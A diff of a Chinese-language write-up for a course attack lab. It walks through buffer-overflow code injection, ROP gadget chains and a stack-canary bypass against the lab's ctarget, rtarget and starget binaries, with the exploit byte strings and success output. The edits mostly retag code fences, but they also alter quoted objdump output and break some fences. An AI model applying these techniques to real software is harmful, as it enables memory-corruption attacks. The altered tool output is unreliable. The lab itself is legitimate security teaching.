@@ -10,7 +10,7 @@ objdump -t ctarget > ctarget.s
 
 查找 `getBuf()` 函数确定调用分配的空间：
 
-```assembly
+```asm
 0000000000401e5a <getbuf>:
   401e5a:	f3 0f 1e fa          	endbr64 
   401e5e:	48 83 ec 18          	sub    $0x18,%rsp
@@ -25,7 +25,7 @@ objdump -t ctarget > ctarget.s
 
 继续查找 `touch1` 函数所在地址：
 
-```assembly
+```asm
 0000000000401f24 <touch1>:
   401f24:	f3 0f 1e fa          	endbr64 
   401f28:	50                   	push   %rax
@@ -45,7 +45,7 @@ objdump -t ctarget > ctarget.s
 
 于是得出输入字符串：
 
-```assembly
+```asm
 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 24 1f 40 00
 ```
 
@@ -70,7 +70,7 @@ NICE JOB!
 
 ## Phase 2
 
-```
+```md
 gdb ctarget
 b getbuf
 r
@@ -84,7 +84,7 @@ layout regs
 
 然后，编写我们的代码，储存为 `p2.s`：
 
-```assembly
+```asm
 movq $0x11a67610,%rdi
 pushq $0x401f58
 ret
@@ -109,12 +109,12 @@ objdump -d p2.o > p2.byte # 翻译为字节码
 
 得到 `p2.byte`：
 
-```assembly
+```asm
 
 p2.o:     file format elf64-x86-64
 
 
-Disassembly of section .text:
+Disasm of section .text:
 
 0000000000000000 <.text>:
    0:	48 c7 c7 10 76 a6 11 	mov    $0x11a67610,%rdi
@@ -125,7 +125,7 @@ Disassembly of section .text:
 
 组合我们的代码：
 
-```assembly
+```asm
 48 c7 c7 10 76 a6 
 11 68 58 1f 40 00 
 c3 00 00 00 00 00 
@@ -142,7 +142,7 @@ c3 00 00 00 00 00
 
 于是大功告成！
 
-```
+```md
 Cookie: 0x11a67610
 Touch2!: You called touch2(0x11a67610)
 Valid solution for level 2 with target ctarget
@@ -173,7 +173,7 @@ NICE JOB!
 * 接着 pushq 0x40207d（touch3 的地址）
 * ret，从而跳转进入 touch3
 
-```assembly
+```asm
 48 c7 c7 10 76 a6 11 68 
 7d 20 40 00 c3 3f 3f 3f 
 3f 3f 3f 3f 3f 3f 3f 3f 
@@ -218,7 +218,7 @@ x/20x 0x55634688
 
 可以发现此时我们放在缓冲区的内容还没有被修改，继续 si，直到进入 `hexmatch` 函数，继续执行完成 `sub    $0x88,%rsp`，再次执行上述查看缓冲区的命令，得到
 
-```
+```md
 (gdb) x/20x 0x55634688
 0x55634688:     0x00404247      0x00000000      0x00000000      0x00000000
 0x55634698:     0x0040209d      0x00000000      0x00000000      0x00000000
@@ -235,7 +235,7 @@ x/20x 0x55634688
 
 于是我们首先将 cookie 转为 ascii 码 `31 31 61 36 37 36 31 30`，然后控制我们的输入，除了第一次 ret 需要更改的四个字节外，保持原有字节不动，直至溢出至 `0x556346b8` ，才再次加入我们需要覆写的字节，并调整存在 % rdi 中的数值为 `0x556346b8` ，于是我们得到我们实际应当输入的字节码：
 
-```assembly
+```asm
 48 c7 c7 b8 46 63 55 68 
 7d 20 40 00 c3 3f 3f 3f 
 3f 3f 3f 3f 3f 3f 3f 3f 
@@ -254,7 +254,7 @@ x/20x 0x55634688
 
 于是再次大功告成！
 
-```
+```md
 Cookie: 0x11a67610
 Touch3!: You called touch3("11a67610")
 Valid solution for level 3 with target ctarget
@@ -285,7 +285,7 @@ objdump -d farm.o > farm.s
 
 因为我们实际要利用的是代码片段根据不同起始引发的 “二义性”，所以我在 VS Code 中执行了如下的正则表达式替换：
 
-```
+```md
 .+:\t(([0-9a-f]{2} )+).+ ➡️ $1
 
 (([0-9a-f]{2} )+)\n ➡️ $1
@@ -293,7 +293,7 @@ objdump -d farm.o > farm.s
 
 这样就可以让我的代码变得只有字节，也就便于我们后续查找我们所需要的 gadget：
 
-```assembly
+```asm
 000000000000000f <getval_442>:
 f3 0f 1e fa 55 48 89 e5 b8 48 89 c7 91 5d c3 
 ```
@@ -302,21 +302,21 @@ f3 0f 1e fa 55 48 89 e5 b8 48 89 c7 91 5d c3
 
 > 如 Phase5 中，以此法得到：
 >
-> ```
+> ```md
 > 00000000004022e8 <addval_436>:
 > f3 0f 1e fa 8d 87 89 ca 84 c0 c3 
-> ```
+> ```md
 >
 > 若依此法定位 `89 ca 84 c0 c3 ` 字符串，得到 `0x4022ed`
 >
 > 但是，这会导致段错误，因为原函数反编译直接得到的是：
 >
-> ```
+> ```md
 > 00000000004022e8 <addval_436>:
 >   4022e8:	f3 0f 1e fa          	endbr64 
 >   4022ec:	8d 87 89 ca 84 c0    	lea    -0x3f7b3577(%rdi),%eax
 >   4022f2:	c3                   	ret  
-> ```
+> ```md
 >
 > 原函数在 0x4022e8 这一行隐式进行了对齐，所以跳过了一个字节，也即正确的字节是
 >
@@ -326,7 +326,7 @@ f3 0f 1e fa 55 48 89 e5 b8 48 89 c7 91 5d c3
 
 ![Cleanshot-2023-10-18-at-08.25.14@2x](./README.assets/Cleanshot-2023-10-18-at-08.25.14@2x.png)
 
-```
+```md
 5[89a-f] c3
 ```
 
@@ -345,7 +345,7 @@ f3 0f 1e fa 55 48 89 e5 b8 48 89 c7 91 5d c3
 
 直接检索公用后缀即可：
 
-```
+```md
 89 e[89a-f] c3
 ```
 
@@ -353,13 +353,13 @@ f3 0f 1e fa 55 48 89 e5 b8 48 89 c7 91 5d c3
 
 于是又经历几次踩坑，我最终听从树洞的说法，直接忽视了 handout 里要求只能在 farm.c 中查找的要求，转而对 rtarget 直接进行检索：
 
-```
+```md
 objdump -d rtarget > rtarget.s
 ```
 
 如同前文一样，进行正则表达式替换或者直接使用如下式子检索跳行的 `c3`：
 
-```
+```md
 5[89a-f](\s+\t.+\n.+:\t)c3
 ```
 
@@ -367,7 +367,7 @@ objdump -d rtarget > rtarget.s
 
 在文件末尾找到了一个 `5f c3`，对应 `popq %rdi` ，直接一步到位！
 
-```
+```md
   403912:	41 5f                	pop    %r15
   403914:	c3     
 ```
@@ -382,7 +382,7 @@ objdump -d rtarget > rtarget.s
 
 直接构造 `p4.txt`：
 
-```
+```md
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -393,7 +393,7 @@ a8 1e 40 00 00 00 00 00
 
 运行
 
-```
+```md
 ./hex2raw < p4.txt > p4a.txt
 ./rtarget -i p4a.txt
 ```
@@ -411,7 +411,7 @@ a8 1e 40 00 00 00 00 00
 
 所以我们类似地，在 `rtarget.s` 中检索一些 NOP 指令以对齐，我选择的是 `20 c0` ，直接检索找到
 
-```assembly
+```asm
 000000000040223c <setval_254>:
   40223c:	f3 0f 1e fa          	endbr64 
   402240:	c7 07 c9 ca 20 c0    	movl   $0xc020cac9,(%rdi)
@@ -427,7 +427,7 @@ a8 1e 40 00 00 00 00 00
 修改 p4.txt 如下，加入第 6 行即可
 
 
-```
+```md
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -439,14 +439,14 @@ a8 1e 40 00 00 00 00 00
 
 运行
 
-```
+```md
 ./hex2raw < p4.txt > p4a.txt
 ./rtarget -i p4a.txt
 ```
 
 ~~大功告成！~~
 
-```
+```md
 Cookie: 0x11a67610
 Touch2!: You called touch2(0x11a67610)
 Valid solution for level 2 with target rtarget
@@ -456,27 +456,27 @@ NICE JOB!
 
 告不了一点，发现得到的是 0.0 的分数，说明越界的 gadget 在远程服务器上无法得分，于是询问大佬，发现之前的过程中忘了可以插入 `0x90` 作为 nop，于是再次检索：
 
-```
+```md
 5[89a-f] (90 )+c3
 ```
 
 成功找到一个新地址 `0x4021bc`，可以实现 `popq %rax`
 
-```
+```md
 00000000004021b4 <addval_168>:
 f3 0f 1e fa 8d 87 0d 92 58 90 c3 
 ```
 
 同时，我们还需要 `movq %rax %rdi` 或者 `movl %eax %edi`，查表对应 `48 89 c7`，检查得到第二个地址：`0x4021a4`
 
-```
+```md
 000000000040219e <setval_337>:
 f3 0f 1e fa c7 07 48 89 c7 c3 c3 
 ```
 
 修改 p4.txt
 
-```
+```md
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -488,7 +488,7 @@ a8 1e 40 00 00 00 00 00
 
 运行
 
-```
+```md
 ./hex2raw < p4.txt > p4a.txt
 ./rtarget -i p4a.txt
 ```
@@ -505,7 +505,7 @@ a8 1e 40 00 00 00 00 00
 
 根据在 Phase4 中所述方法，首先将全文替换为字节码，以函数截断：
 
-```
+```md
 # Bash
 objdump -d rtarget > rtarget.s
 cp rtarget.s rtarget.s2
@@ -528,7 +528,7 @@ cp rtarget.s rtarget.s2
 
 对照表格和拥有的 farm，编写代码 `p5.s`：
 
-```assembly
+```asm
 movq %rsp,%rax
 ret
 movq %rax,%rdi
@@ -554,7 +554,7 @@ ret
 
 运行：
 
-```
+```md
 gcc -c p5.s && objdump -d p5.o > p5.byte
 ```
 
@@ -565,7 +565,7 @@ gcc -c p5.s && objdump -d p5.o > p5.byte
 p5.o:     file format elf64-x86-64
 
 
-Disassembly of section .text:
+Disasm of section .text:
 
 0000000000000000 <.text>:
    0:	48 89 e0             	mov    %rsp,%rax
@@ -594,7 +594,7 @@ Disassembly of section .text:
 
 于是我们得到 `p5.txt`：
 
-```assembly
+```asm
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -621,7 +621,7 @@ cd 1f 40 00 00 00 00 00
 
 大功告成！
 
-```
+```md
 Cookie: 0x11a67610
 Touch3!: You called touch3("11a67610")
 Valid solution for level 3 with target rtarget
@@ -645,7 +645,7 @@ objdump -d starget > starget.s
 
 但我们同时注意到，其代码中存在两个奇怪的 `memcpy` 函数，分别位于 `0x402141` 和 `0x40216a`：
 
-```assembly
+```asm
   402118:	e8 ed 02 00 00       	call   40240a <Gets>
   40211d:	8b 85 70 ff ff ff    	mov    -0x90(%rbp),%eax
   402123:	48 63 d0             	movslq %eax,%rdx
@@ -691,7 +691,7 @@ void *memcpy(void *str1, const void *str2, size_t n)
 
 于是我们可以开始构造输入值 `p6.txt`，通过控制两次复制的长度，以实现第一次复制时将金丝雀值复制下来，同时在第二次复制时，将金丝雀值连同我们注入的 ROP 共计代码复制上去，从而实现绕过金丝雀值的保护：
 
-```assembly
+```asm
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -731,7 +731,7 @@ cd 1f 40 00 00 00 00 00
 
 所以我们略微调整一下输入代码，引入一下 phase4 中就找到的无义序列地址 `0x402244` 并减少后面的一行代码，得到新的 `p6.txt`：
 
-```assembly
+```asm
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
 00 00 00 00 00 00 00 00 
@@ -776,7 +776,7 @@ cd 1f 40 00 00 00 00 00
 
 一遍通过！
 
-```
+```md
 Cookie: 0x11a67610
 Touch3!: You called touch3("11a67610")
 Valid solution for level 3 with target starget
